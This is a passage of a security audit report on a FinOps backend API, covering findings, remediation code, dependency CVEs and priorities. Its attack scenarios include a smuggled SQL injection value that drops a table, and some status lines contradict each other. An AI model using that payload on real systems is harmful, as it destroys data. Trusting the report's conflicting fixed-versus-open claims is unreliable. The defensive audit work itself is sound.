    # - account_ids length (could be thousands)
    # - group_by parameter (not validated against allowlist)

    # Lines 190-203: Loops through ALL accounts without batching
    for account_id in account_ids:
        result = await self._query_account_cost(account_id, start_date, end_date)
```

**Issue:** Multiple parameter validation failures create resource exhaustion vulnerabilities:

1. **No date range validation** - Could query years of historical data
2. **No account limit** - Could aggregate 10,000+ accounts
3. **No group_by validation** - SQL injection potential
4. **No batching** - Loops serially through all accounts
5. **No timeout** - Long-running queries never cancelled

**Attack Scenarios:**

```python
# Scenario 1: Query all time for all accounts
GET /api/v1/phase3/accounts/aggregate-costs?
  start_date=2000-01-01&
  end_date=2050-12-31&
  group_by=service
# Result: Massive Athena query costs, timeout

# Scenario 2: Include thousands of accounts
GET /api/v1/phase3/accounts/aggregate-costs?
  account_ids=account1,account2,...,account10000&
  start_date=2020-01-01&
  end_date=2026-12-31
# Result: API rate limiting, cost escalation

# Scenario 3: SQL injection via group_by
GET /api/v1/phase3/accounts/aggregate-costs?
  group_by=service; DROP TABLE costs--
# Result: Potential SQL injection (if not properly parameterized)
```

**Impact:**
- Resource exhaustion
- Excessive AWS costs from Athena queries
- API throttling affecting all users
- Service degradation
- Potential DoS

#### Remediation

```python
# Add validation constants
MAX_ACCOUNT_IDS = 100
MAX_DATE_RANGE_DAYS = 90
ALLOWED_GROUP_BY = {'account', 'service', 'region', 'resource_type'}

async def aggregate_costs_across_accounts(
    self,
    account_ids: Optional[List[str]],
    start_date: str,
    end_date: str,
    group_by: str = 'account'
):
    # Validate group_by against allowlist
    if group_by not in ALLOWED_GROUP_BY:
        raise ValueError(f"Invalid group_by. Allowed values: {ALLOWED_GROUP_BY}")

    # Validate date range
    start = datetime.fromisoformat(start_date)
    end = datetime.fromisoformat(end_date)
    date_range_days = (end - start).days

    if date_range_days > MAX_DATE_RANGE_DAYS:
        raise ValueError(f"Date range exceeds maximum of {MAX_DATE_RANGE_DAYS} days")

    if date_range_days < 0:
        raise ValueError("End date must be after start date")

    # Handle account_ids
    if not account_ids:
        # Limit fetched accounts
        query = f"SELECT account_id FROM aws_accounts WHERE status = 'ACTIVE' LIMIT {MAX_ACCOUNT_IDS}"
        accounts = await self.db.fetch_all(query)
        account_ids = [acc['account_id'] for acc in accounts]
    else:
        # Validate count
        if len(account_ids) > MAX_ACCOUNT_IDS:
            raise ValueError(f"Maximum {MAX_ACCOUNT_IDS} accounts allowed per request. "
                           f"Please use pagination for larger sets.")

    # Validate account ID format (prevent injection)
    for account_id in account_ids:
        if not re.match(r'^\d{12}$', account_id):
            raise ValueError(f"Invalid AWS account ID format: {account_id}")

    # Batch processing
    batch_size = 10
    results = []
    for i in range(0, len(account_ids), batch_size):
        batch = account_ids[i:i+batch_size]
        batch_results = await asyncio.gather(*[
            self._query_account_cost(acc, start_date, end_date)
            for acc in batch
        ])
        results.extend(batch_results)
```

#### Claude Code Fix Instructions

```
In backend/services/multi_account_service.py:

1. Add validation constants at top of file:

   MAX_ACCOUNT_IDS = 100
   MAX_DATE_RANGE_DAYS = 90
   ALLOWED_GROUP_BY = {'account', 'service', 'region', 'resource_type', 'usage_type'}

2. Add validation at start of aggregate_costs_across_accounts (line 166):

   # Validate group_by
   if group_by not in ALLOWED_GROUP_BY:
       raise ValueError(f"Invalid group_by parameter. Allowed: {', '.join(ALLOWED_GROUP_BY)}")

   # Validate date range
   from datetime import datetime
   start = datetime.fromisoformat(start_date)
   end = datetime.fromisoformat(end_date)

   if (end - start).days > MAX_DATE_RANGE_DAYS:
       raise ValueError(f"Date range cannot exceed {MAX_DATE_RANGE_DAYS} days")

   if end < start:
       raise ValueError("End date must be after start date")

3. Add account validation (line 172):

   if account_ids and len(account_ids) > MAX_ACCOUNT_IDS:
       raise ValueError(
           f"Maximum {MAX_ACCOUNT_IDS} accounts per request. Use pagination for larger sets."
       )

   # Validate account ID format
   import re
   for acc_id in (account_ids or []):
       if not re.match(r'^\d{12}$', str(acc_id)):
           raise ValueError(f"Invalid account ID format: {acc_id}")

4. Add LIMIT to ALL accounts query (line 174):

   BEFORE:
       query = "SELECT account_id FROM aws_accounts WHERE status = 'ACTIVE'"

   AFTER:
       query = f"SELECT account_id FROM aws_accounts WHERE status = 'ACTIVE' LIMIT {MAX_ACCOUNT_IDS}"

5. Implement batching in query loop (line 190):

   BEFORE:
       for account_id in account_ids:
           result = await self._query_account_cost(...)

   AFTER:
       import asyncio
       batch_size = 10
       results = []
       for i in range(0, len(account_ids), batch_size):
           batch = account_ids[i:i+batch_size]
           batch_results = await asyncio.gather(*[
               self._query_account_cost(acc, start_date, end_date)
               for acc in batch
           ])
           results.extend(batch_results)
```

---

## 4 — LOW SEVERITY

### LOW-1 — Weak Default Passwords in docker-compose

**Status:** OPEN (carried from 2026-01-31 audit - NOT FIXED)
**File:** `docker-compose.yml`

```yaml
POSTGRES_PASSWORD: ${POSTGRES_PASSWORD:-finops_password}
VALKEY_PASSWORD:   ${VALKEY_PASSWORD:-valkey_password}
```

**Issue:** If no `.env` file exists, these trivially-guessable defaults are used silently. A developer who forgets to create `.env` ships a system with known credentials.

#### Remediation

Remove the fallback defaults. Let Docker fail loudly if the variables are not set:

```yaml
POSTGRES_PASSWORD: ${POSTGRES_PASSWORD:?Error: POSTGRES_PASSWORD is required}
VALKEY_PASSWORD: ${VALKEY_PASSWORD:?Error: VALKEY_PASSWORD is required}
```

#### Claude Code Fix Instructions

```
In docker-compose.yml:

Replace password environment variables with required checks:

BEFORE:
    POSTGRES_PASSWORD: ${POSTGRES_PASSWORD:-finops_password}
    VALKEY_PASSWORD: ${VALKEY_PASSWORD:-valkey_password}

AFTER:
    POSTGRES_PASSWORD: ${POSTGRES_PASSWORD:?Error: POSTGRES_PASSWORD is required}
    VALKEY_PASSWORD: ${VALKEY_PASSWORD:?Error: VALKEY_PASSWORD is required}
```

---

### LOW-2 — Deprecated `regex` Validator in Pydantic Model — FIXED

**Status:** FIXED — see F-13 in Section 1.

`Field(..., regex=…)` replaced with `Field(..., pattern=…)` in `phase3_enterprise.py`. Under Pydantic v2, the old `regex` keyword raises `PydanticUserError` at class-definition time rather than silently ignoring the constraint. The fix was applied as a prerequisite for the HIGH-3 test suite and is verified by a static assertion in `TestStaticAnalysis`.

---

### LOW-3 — Unbounded Audit Query Parameters

**Status:** OPEN (carried from 2026-01-31 audit - NOT FIXED)
**File:** `backend/api/phase3_enterprise.py`, `/audit/recent` endpoint

```python
async def get_recent_audit_logs(
    hours: int = 24,    # no upper bound
    limit: int = 1000,  # no upper bound
```

**Issue:** A user can request `hours=999999` and `limit=1000000`, generating an extremely large database query with no guardrails.

#### Remediation

Add `le` constraints:

```python
hours: int = Field(default=24, ge=1, le=168)     # max 1 week
limit: int = Field(default=100, ge=1, le=1000)
```

#### Claude Code Fix Instructions

```
In backend/api/phase3_enterprise.py, /audit/recent endpoint:

Update parameter definitions:

BEFORE:
    hours: int = 24
    limit: int = 1000

AFTER:
    from pydantic import Field

    hours: int = Field(default=24, ge=1, le=168, description="Hours to look back (max 1 week)")
    limit: int = Field(default=100, ge=1, le=1000, description="Maximum records to return")
```

---

### LOW-NEW-4 — Token Hashing Uses SHA-256 Instead of HMAC

**CVSS Estimate:** 4.3
**Status:** OPEN (new finding - discovered 2026-02-08)
**File:** `backend/services/cache_service.py:108-114`

**Vulnerability:**
```python
def _hash_token(self, token: str) -> str:
    """Create a secure hash of a token for storage. Uses SHA-256..."""
    return hashlib.sha256(token.encode()).hexdigest()
```

**Issue:** Uses SHA-256 (fast cryptographic hash) instead of HMAC for token hashing. While JWTs have high entropy making brute-force impractical, best practice is to use HMAC with a secret key for additional protection.

**Risk:** If cache is compromised, attacker could attempt to crack token hashes. Risk is LOW due to high JWT entropy, but HMAC would add key-based protection layer.

#### Remediation

```python
import hmac

def _hash_token(self, token: str) -> str:
    """Create a secure HMAC hash of a token using secret key"""
    from backend.config.settings import get_settings
    settings = get_settings()
    secret = settings.secret_key.encode()
    return hmac.new(secret, token.encode(), hashlib.sha256).hexdigest()
```

#### Claude Code Fix Instructions

```
In backend/services/cache_service.py:

1. Add import at top:
   import hmac

2. Update _hash_token method (lines 108-114):

   BEFORE:
       def _hash_token(self, token: str) -> str:
           return hashlib.sha256(token.encode()).hexdigest()

   AFTER:
       def _hash_token(self, token: str) -> str:
           """Create a secure HMAC hash of a token"""
           from backend.config.settings import get_settings
           settings = get_settings()
           secret = settings.secret_key.encode()
           return hmac.new(secret, token.encode(), hashlib.sha256).hexdigest()

Note: This is a breaking change. Consider migration strategy for existing blacklisted tokens.
```

---

### LOW-NEW-5 — Organization Slug Generation Could Have Collisions

**CVSS Estimate:** 3.1
**Status:** OPEN (new finding - discovered 2026-02-08)
**File:** `backend/services/organization_service.py:68-80`

**Vulnerability:**
```python
if existing.mappings().first():
    import secrets
    slug = f"{slug}-{secrets.token_hex(3)}"  # Only 3 bytes = 16M combinations
```

**Issue:** Uses only 3 bytes (6 hex characters) for collision resolution. With many organizations having similar names, collision probability increases (16.7M possible combinations).

**Impact:** Organization creation failures, poor user experience, potential DoS through collision exhaustion.

#### Remediation

Increase entropy to 6 bytes:

```python
if existing.mappings().first():
    import secrets
    slug = f"{slug}-{secrets.token_hex(6)}"  # 6 bytes = 281 trillion combinations
```

Better approach with retry loop:

```python
max_attempts = 10
base_slug = slug

for attempt in range(max_attempts):
    test_slug = f"{base_slug}-{secrets.token_hex(4)}" if attempt > 0 else base_slug

    existing = await conn.execute(
        "SELECT id FROM organizations WHERE slug = :slug",
        {'slug': test_slug}
    )

    if not existing.mappings().first():
        slug = test_slug
        break
else:
    raise ValueError(f"Could not generate unique slug after {max_attempts} attempts")
```

#### Claude Code Fix Instructions

```
In backend/services/organization_service.py lines 68-80:

Quick fix:
BEFORE: slug = f"{slug}-{secrets.token_hex(3)}"
AFTER:  slug = f"{slug}-{secrets.token_hex(6)}"

Or implement retry loop as shown in remediation section above.
```

---

## 5 — DEPENDENCY VULNERABILITIES

**Verification Date:** 2026-02-08
**Status:** 4 packages VULNERABLE, requiring immediate updates

### Current Installed Versions

| Package | Installed | Required | CVE | Status |
|---------|-----------|----------|-----|--------|
| aiohttp | **3.13.3** | ≥ 3.13.3 | CVE-2025-69223 | ✅ **SECURE** |
| starlette | **0.41.3** | ≥ 0.49.1 | CVE-2025-62727 | ❌ **VULNERABLE** |
| urllib3 | **2.6.3** | ≥ 2.6.3 | CVE-2025-66418 | ✅ **SECURE** |
| langchain-core | **0.3.83** | ≥ 0.3.81 | CVE-2025-65106 | ✅ **SECURE** |
| pypdf | **6.0.0** | ≥ 6.6.0 | CVE-2025-62707 | ❌ **VULNERABLE** |
| filelock | **3.19.1** | ≥ 3.20.3 | CVE-2025-68146 | ❌ **VULNERABLE** |
| marshmallow | **3.26.1** | ≥ 3.26.2 | CVE-2025-68480 | ❌ **VULNERABLE** |

### HIGH PRIORITY: Immediate Updates Required

**Critical (Update Immediately):**
```bash
# Starlette - CRITICAL CVE-2025-62727
pip install --upgrade 'starlette>=0.49.1'
```

**High Priority (Update Soon):**
```bash
pip install --upgrade 'pypdf>=6.6.0'
pip install --upgrade 'filelock>=3.20.3'
pip install --upgrade 'marshmallow>=3.26.2'
```

### Update Instructions

**File:** `backend/requirements.txt`

```python
# Line 98 - Update starlette (CRITICAL)
BEFORE: starlette>=0.49.1
AFTER:  starlette>=0.49.1  # Verify installed version matches

# Add or update these lines:
pypdf>=6.6.0       # Currently 6.0.0
filelock>=3.20.3   # Currently 3.19.1
marshmallow>=3.26.2  # Currently 3.26.1
```

**Execute updates:**
```bash
cd backend
pip install --upgrade starlette pypdf filelock marshmallow
pip freeze > requirements_updated.txt
# Review changes
pytest  # Verify tests pass
```

### CVE Details

**CVE-2025-62727 (Starlette):**
- **Severity:** CRITICAL
- **Impact:** Request smuggling, authentication bypass
- **Current Version:** 0.41.3 (VULNERABLE)
- **Fixed In:** 0.49.1+
- **Action:** IMMEDIATE UPDATE REQUIRED

**CVE-2025-62707 (pypdf):**
- **Severity:** HIGH
- **Impact:** Arbitrary code execution via malicious PDF
- **Current Version:** 6.0.0 (VULNERABLE)
- **Fixed In:** 6.6.0+

**CVE-2025-68146 (filelock):**
- **Severity:** MEDIUM
- **Impact:** Race condition in file locking
- **Current Version:** 3.19.1 (VULNERABLE)
- **Fixed In:** 3.20.3+

**CVE-2025-68480 (marshmallow):**
- **Severity:** MEDIUM
- **Impact:** Schema validation bypass
- **Current Version:** 3.26.1 (VULNERABLE)
- **Fixed In:** 3.26.2+

### Verification Command

```bash
cd backend && python -m pip list | grep -iE "aiohttp|starlette|urllib3|langchain|pypdf|filelock|marshmallow"
```

### Claude Code Fix Instructions

```
1. Update backend/requirements.txt:

   Verify these lines exist with correct minimum versions:
   starlette>=0.49.1  # Line 98
   pypdf>=6.6.0       # Add or update
   filelock>=3.20.3   # Add or update
   marshmallow>=3.26.2  # Update existing line

2. Run upgrade:
   cd backend
   pip install --upgrade -r requirements.txt

3. Freeze updated versions:
   pip freeze > requirements.txt

4. Test:
   pytest

5. Verify:
   pip list | grep -iE "starlette|pypdf|filelock|marshmallow"
```

---

## 6 — POSITIVE SECURITY CONTROLS (Correctly Implemented)

| Control | Location | Status | Notes |
|---------|----------|--------|-------|
| JWT-only authentication | `middleware/authentication.py` | ✅ Strong | No header fallback; expiry enforced; proper signature validation |
| Token blacklisting on logout | `services/cache_service.py` | ⚠️ Good | Fail-closed behavior; TTL matches lifetime; ⚠️ uses SHA-256 instead of HMAC (LOW-NEW-4) |
| SQL injection prevention | `utils/sql_validation.py` | ✅ Excellent | Comprehensive validation; allowlist approach; used throughout |
| LLM-generated SQL validation | `text_to_sql_service.py` | ✅ Strong | Blocks multi-statement queries, DDL/DML operations |
| Account ID regex validation | `services/request_context.py` | ✅ Strong | `^[0-9]{12}$` validation before SQL injection |
| PII masking utilities | `utils/pii_masking.py` | ⚠️ Available | Comprehensive utilities exist but underused (see HIGH-6) |
| Rate limiting middleware | `middleware/rate_limiting.py` | ⚠️ Partial | Implemented but needs expansion (see HIGH-NEW-7) |
| Security headers middleware | `middleware/security_headers.py` | ✅ Excellent | CSP, HSTS, X-Frame-Options, Referrer-Policy, Permissions-Policy |
| Secret key enforcement | `config/settings.py:287-341` | ✅ Strong | Rejects weak values; 32-char minimum; production validation |
| CORS explicit config | `main.py` + `settings.py` | ✅ Strong | No wildcards with credentials; explicit origins/methods/headers |
| Exception sanitization | `utils/errors.py` | ✅ Good | Generic messages enforced; ⚠️ dev mode exposes details (MED-NEW-13) |
| RBAC system | `rbac_permission_service.py` | ✅ Strong | Configuration-based permissions; replaces hardcoded checks |
| Audit logging | `audit_log_service.py` | ✅ Good | Comprehensive audit trail for sensitive operations |
| IDOR protection | Multiple files | ✅ Strong | Fixed in 2026-02-08 (conversations, opportunities, saved views) |
| Password hashing | `auth.py` | ⚠️ Good | PBKDF2-HMAC-SHA256 with salt; ⚠️ only 100k iterations (HIGH-NEW-2) |
| Clickjacking protection | `security_headers.py` | ✅ Strong | X-Frame-Options DENY + CSP frame-ancestors |
| IAM role usage | `aws_session.py` | ✅ Strong | Replaces hardcoded credentials; centralized session management |

### Security Controls Requiring Enhancement

| Control | Current State | Enhancement Needed | Priority |
|---------|---------------|-------------------|----------|
| CSRF Protection | ❌ Missing | Implement token or header validation | HIGH |
| Password Policy | ⚠️ Weak | Increase minimum length, complexity rules | MEDIUM |
| Rate Limiting | ⚠️ Partial | Apply to all critical endpoints | HIGH |
| Token Hashing | ⚠️ SHA-256 | Migrate to HMAC-SHA256 | LOW |
| Password Hashing | ⚠️ 100k iterations | Increase to 600k+ iterations | HIGH |
| PII Masking | ⚠️ Underused | Apply consistently in all logging | HIGH |
| Concurrency Control | ❌ Missing | Implement row-level locking | HIGH |

---

## 7 — REMEDIATION PRIORITY

### 🚨 CRITICAL — Fix Immediately (Before Any Production Traffic)

| Priority | Finding | CVSS | Effort | Status |
|----------|---------|------|--------|--------|
| 1 | **CRIT-NEW-1** Command Injection in migrations | 9.1 | 2 hours | ✅ **FIXED** |
| 2 | ~~**HIGH-4** Jinja2 SSTI~~ | ~~8.8~~ | ~~1 hour~~ | ✅ **FIXED** |
| 3 | ~~**HIGH-5** SSRF via webhooks~~ | ~~8.1~~ | ~~2 hours~~ | ✅ **FIXED** |
| 4 | **DEPENDENCY** Starlette 0.41.3 → 0.49.1+ | CRITICAL | 30 min | OPEN |
| 5 | **HIGH-NEW-2** PBKDF2 iterations 100k → 600k | 7.5 | 30 min | OPEN |

**Estimated Total Time:** 1 hour (3 issues fixed, 2 remaining)

---

### ⚠️ HIGH PRIORITY — Before GA / Next Sprint

| Priority | Finding | CVSS | Effort | Category |
|----------|---------|------|--------|----------|
| 6 | **HIGH-NEW-3** CSRF protection missing | 7.2 | 4 hours | Web Security |
| 7 | **HIGH-NEW-4** Race conditions in opportunities | 7.8 | 3 hours | Business Logic |
| 8 | **HIGH-NEW-5** TOCTOU in saved views | 7.5 | 2 hours | Business Logic |
| 9 | **HIGH-NEW-6** Mass assignment vulnerability | 7.5 | 2 hours | Authorization |
| 10 | **HIGH-NEW-7** Rate limiting on critical ops | 7.5 | 4 hours | DoS Protection |
| 12 | **MED-1** Account scoping fail-closed | 6.5 | 1 hour | Authorization |
| 13 | **MED-10** Chat error sanitization | 6.2 | 1 hour | Info Disclosure |

**Estimated Total Time:** 18 hours

---

### 📋 MEDIUM PRIORITY — Within 30 Days

| Category | Issues | Effort |
|----------|--------|--------|
| **Web Security** | MED-2 (Metrics auth), MED-5 (SSE injection), MED-6 (Rate limit), MED-8 (Sourcemaps) | 6 hours |
| **Data Security** | MED-3 (LLM logs), MED-4 (Password policy), MED-7 (SSL mode), MED-10 (Error leaks) | 4 hours |
| **Business Logic** | MED-11 (Cron validation), MED-NEW-13 (Stack traces), MED-NEW-14 (Org race), MED-NEW-15 (TOCTOU), MED-NEW-16 (Parameter validation) | 8 hours |
| **Configuration** | MED-9 (CDN package) | 1 hour |
| **Dependencies** | pypdf, filelock, marshmallow updates | 1 hour |
| **Low Priority** | LOW-1, LOW-3, LOW-NEW-4, LOW-NEW-5 | 3 hours |

**Estimated Total Time:** 23 hours

---

### 📊 TESTING & VALIDATION

| Activity | Effort | Priority |
|----------|--------|----------|
| Comprehensive security testing after fixes | 8 hours | HIGH |
| External penetration test | External vendor | HIGH |
| Automated security scanning (SAST/DAST) | 4 hours | MEDIUM |
| Bug bounty program setup | 8 hours | MEDIUM |

---

### Total Remediation Estimate: 47 hours + external testing

---

## 8 — COMPLIANCE NOTES

| Framework | Gap | Remediation | Status |
|-----------|-----|-------------|--------|
| **SOC 2** | Audit logs fail-open on scoping errors | Fix MED-1 | OPEN |
| **SOC 2** | Insufficient audit trail for financial calculations | Fix race conditions (HIGH-NEW-4) | OPEN |
| **GDPR** | Email PII in authentication logs | ✅ Fixed (F-22) | FIXED |
| **GDPR** | Stack traces expose PII in dev mode | Fix MED-NEW-13 | OPEN |
| **PCI DSS** | Insufficient password hashing iterations (100k < 600k) | Fix HIGH-NEW-2 | OPEN |
| **PCI DSS** | Weak password policy (min_length=1) | Fix MED-4 | OPEN |
| **AWS Well-Architected** | Command injection in database operations | ✅ Fixed (F-18) | FIXED |
| **AWS Well-Architected** | IAM role usage | ✅ Fixed (F-10) | FIXED |
| **OWASP Top 10** | A03:2021 Injection (SSTI, Command) | ✅ Fixed (F-18, F-14) | FIXED |
| **OWASP Top 10** | A04:2021 Insecure Design (Race conditions, TOCTOU) | Fix HIGH-NEW-4, HIGH-NEW-5, MED-NEW-14, MED-NEW-15 | OPEN |
| **OWASP Top 10** | A05:2021 Security Misconfiguration (CSRF, weak defaults) | Fix HIGH-NEW-3, LOW-1 | OPEN |
| **OWASP Top 10** | A06:2021 Vulnerable Components (Dependencies) | Update starlette, pypdf, filelock, marshmallow | OPEN |
| **OWASP Top 10** | A07:2021 Authentication Failures (weak hashing) | Fix HIGH-NEW-2, MED-4 | OPEN |
| **OWASP Top 10** | A10:2021 SSRF | ✅ Fixed (F-21) | FIXED |
| **CIS Controls** | Missing rate limiting on critical functions | Fix HIGH-NEW-7 | OPEN |

---

## 9 — SUMMARY AND RECOMMENDATIONS

### Security Posture Assessment

**Overall Rating:** MODERATE RISK

**Strengths:**
- ✅ 19 previously identified critical vulnerabilities successfully remediated
- ✅ Strong authentication framework (JWT with blacklisting)
- ✅ Comprehensive SQL injection prevention
- ✅ Good security headers implementation
- ✅ RBAC system with configuration-based permissions
- ✅ Audit logging infrastructure in place

**Critical Gaps:**
- ❌ 1 CRITICAL command injection vulnerability
- ❌ 9 HIGH severity vulnerabilities (injection, race conditions, weak crypto)
- ❌ 14 MEDIUM severity vulnerabilities
- ❌ 4 vulnerable dependencies (including CRITICAL Starlette CVE)

### Immediate Action Required

1. **Update Starlette immediately** - CRITICAL CVE-2025-62727
2. **Fix command injection** in run_migrations.py - Remote code execution risk
3. **Remediate SSTI** in scheduled reports - Remote code execution risk
4. **Implement CSRF protection** - State-changing operations vulnerable
5. **Fix race conditions** - Financial calculation integrity at risk

### Testing Recommendations

1. **Automated Security Scanning:**
   - Deploy SAST tools (Bandit, Semgrep) in CI/CD
   - Deploy DAST tools (OWASP ZAP) in staging
   - Implement dependency scanning (Snyk, pip-audit)

2. **Manual Testing:**
   - Concurrency testing for race conditions
   - Penetration testing for injection vulnerabilities
   - Business logic testing for authorization bypasses

3. **External Validation:**
   - Hire professional penetration testing firm
   - Consider bug bounty program
   - Schedule quarterly security assessments

### Compliance Roadmap

**Immediate (Week 1):**
- Fix all CRITICAL issues
- Update vulnerable dependencies
- Implement CSRF protection

**Short-term (Weeks 2-4):**
- Fix all HIGH severity issues
- Address GDPR PII leakage
- Strengthen password policies

**Medium-term (Months 2-3):**
- Fix all MEDIUM severity issues
- Implement comprehensive rate limiting
- External penetration test
- SOC 2 compliance preparation

---

*Report generated: **2026-02-08**. All findings verified against source at commit **c6cdb54** on branch **main**.*

*Previous audit: 2026-01-31. Progress: 8 critical issues fixed, 21 new vulnerabilities discovered through enhanced scanning.*

*Audit coverage: Backend (150+ Python files), Frontend (configuration), Infrastructure (Docker, CloudFormation), Dependencies (8 critical packages).*
